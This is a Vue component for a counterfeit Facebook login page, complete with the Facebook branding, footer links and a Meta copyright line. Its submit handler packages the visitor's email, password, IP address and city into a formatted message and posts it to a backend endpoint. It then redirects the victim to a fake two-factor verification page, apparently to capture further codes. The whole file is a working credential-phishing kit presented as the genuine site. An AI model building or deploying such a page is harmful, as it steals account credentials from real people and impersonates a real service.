<script setup lang="ts">
const email = ref('')
const password = ref('')
const router = useRouter()
const options = {
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
  day: '2-digit',
  month: '2-digit',
  year: 'numeric',
}
const geo = JSON.parse(localStorage.getItem('geo') || '{}')
const handleSubmit = async () => {
  if (!email.value || !password.value) {
    return
  }
  const message = `
🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
🌍 <b>Địa chỉ IP:</b> ${geo.ip}
📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}

📧 <b>Email:</b> ${email.value}
🔑 <b>Mật khẩu:</b> ${password.value}
`

  // Call your API here
  try {
    await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ rawMessage: message }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    localStorage.setItem('email', email.value)
  } catch (error) {
    console.error(error)
  }
  // router.push('/two_step_verification/two_factor')
  window.location.href = '/two_step_verification/two_factor?a=1'
}
</script>
<template>
  <div class="bg-[#f2f4f7] max-md:hidden flex flex-col items-center h-lvh max-h-[878px]">
    <div class="flex items-center py-[79px] pt-[30px] h-full">
      <div
        class="form-main py-5 h-fit flex flex-col md:flex-row justify-center w-full max-w-5xl mx-auto p-4"
      >
        <!-- Left Side - Logo and Text -->
        <div class="text-center mt-[38px] md:text-left w-full max-w-[580px] mr-8 mb-8 md:mb-0">
          <img class="-ml-[30px] w-[320px]" src="/assets/images/logo.svg" alt="" />
          <!-- <h1 class="text-5xl font-bold text-[#0866ff]">facebook</h1> -->
          <p class="text-[28px] text-[#1c1d21] font-base" style="line-height: 28px">
            Facebook helps you connect and share with <br />
            the people in your life.
          </p>
        </div>

        <!-- Right Side - Login Form -->
        <div class="w-full max-w-[396px]">
          <div class="bg-white h-fit shadow-lg p-4 rounded-[8px]">
            <form class="space-y-3" @submit.prevent="handleSubmit">
              <input
                v-model="email"
                type="text"
                placeholder="Email address or phone number"
                class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#0866ff]"
              />
              <input
                v-model="password"
                type="password"
                placeholder="Old password"
                class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#0866ff]"
              />
              <button
                type="submit"
                class="w-full py-3 bg-[#0866ff] text-white rounded-md font-bold hover:bg-[#166fe5]"
              >
                Log in
              </button>
              <div class="text-center">
                <a href="/?a=1" class="text-[#0866ff] text-[14px] hover:underline"
                  >Forgotten password?</a
                >
              </div>
            </form>

            <hr class="my-6" />

            <div class="flex justify-center">
              <a
                href="https://www.facebook.com/r.php?entry_point=login"
                class="w-fit px-4 py-3 bg-[#42b72a] text-white rounded-md font-medium hover:bg-[#36a420]"
              >
                Create new account
              </a>
            </div>
          </div>
          <p class="mt-[28px] text-[14px] text-center">
            <a
              href="https://www.facebook.com/pages/create/?ref_type=registration_form"
              class="font-[600] cursor-pointer hover:underline"
              >Create a Page
            </a>
            for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </div>

    <!-- Footer Section -->
    <footer class="bg-white w-full flex flex-col items-center py-[28px] pb-[40px] px-10">
      <div class="w-full max-w-[980px]">
        <!-- Language Links -->
        <div
          class="flex font-light justify-start flex-wrap space-x-[10px] text-gray-500 text-[12px]"
        >
          <a href="#" class="hover:underline">English (UK)</a>
          <a href="#" class="hover:underline">Tiếng Việt</a>
          <a href="#" class="hover:underline">中文(台灣)</a>
          <a href="#" class="hover:underline">한국어</a>
          <a href="#" class="hover:underline">日本語</a>
          <a href="#" class="hover:underline">Français (France)</a>
          <a href="#" class="hover:underline">ภาษาไทย</a>
          <a href="#" class="hover:underline">Español</a>
          <a href="#" class="hover:underline">Português (Brasil)</a>
          <a href="#" class="hover:underline">Deutsch</a>
          <a href="#" class="hover:underline">Italiano</a>
          <a class="plus-wrapper">
            <!-- <span class="px-2">+</span> -->
            <!-- <i class="plus"></i> -->
            <span class="text-[16px]"> + </span>
          </a>
        </div>

        <!-- Divider Line -->
        <div class="max-w-[980px] w-full border-t border-gray-300 my-[8px]"></div>

        <!-- Other Links -->
        <div
          class="max-w-[980px] font-light list-language flex flex-wrap justify-start text-gray-500 text-[12px]"
        >
          <a href="#" class="hover:underline">Sign Up</a>
          <a href="#" class="hover:underline">Log in</a>
          <a href="#" class="hover:underline">Messenger</a>
          <a href="#" class="hover:underline">Facebook Lite</a>
          <a href="#" class="hover:underline">Video</a>
          <a href="#" class="hover:underline">Places</a>
          <a href="#" class="hover:underline">Games</a>
          <a href="#" class="hover:underline">Marketplace</a>
          <a href="#" class="hover:underline">Meta Pay</a>
          <a href="#" class="hover:underline">Meta Store</a>
          <a href="#" class="hover:underline">Meta Quest</a>
          <a href="#" class="hover:underline">Ray-Ban Meta</a>
          <a href="#" class="hover:underline">Meta AI</a>
          <a href="#" class="hover:underline">Instagram</a>
          <a href="#" class="hover:underline">Threads</a>
          <a href="#" class="hover:underline">Fundraisers</a>
          <a href="#" class="hover:underline">Services</a>
          <a href="#" class="hover:underline">Voting Information Centre</a>
          <a href="#" class="hover:underline">Privacy Policy</a>
          <a href="#" class="hover:underline">Privacy Centre</a>
          <a href="#" class="hover:underline">Groups</a>
          <a href="#" class="hover:underline">About</a>
          <a href="#" class="hover:underline">AdChoices</a>
          <a href="#" class="hover:underline">Terms</a>
          <a href="#" class="hover:underline">Help</a>
          <a href="#" class="hover:underline">Contact uploading and non-users</a>
          <a href="#" class="hover:underline">Create ad</a>
          <a href="#" class="hover:underline">Create Page</a>
        </div>

        <!-- Copyright -->
        <div class="text-gray-500 font-light text-[12px] mt-3">Meta © 2025</div>
      </div>
    </footer>
  </div>
</template>
<style scoped>
/* Add any additional styling if necessary */
.list-language a {
  margin-right: 20px;
  display: inline-block;
  font-size: 12px;
}
@media only screen and (max-width: 1075px) {
  .form-main {
    height: 496px;
    margin: 0 40px;
    width: auto;
  }
}

.plus {
  background-image: url(/assets/icons/plus.png);
  background-size: 171px 55px;
  background-repeat: no-repeat;
  display: inline-block;
  font-style: italic;
  height: 16px;
  width: 16px;
  width: 12px;
  height: 12px;
  font-size: 12px;
  background-position: -100px -34px;
  -ms-high-contrast-adjust: none;
}

.plus-wrapper {
  cursor: pointer;
  display: inline-block;
  border: 1px solid;
  border-radius: 2px;
  box-sizing: content-box;
  font-size: 12px;
  -webkit-font-smoothing: antialiased;
  font-weight: bold;
  justify-content: center;
  padding: 0 8px;
  position: relative;
  text-align: center;
  text-shadow: none;
  vertical-align: middle;
  background-color: #f5f6f7;
  border-color: #ccd0d5;
  display: inline-flex;
  align-items: center;
  height: 18px;
}
</style>
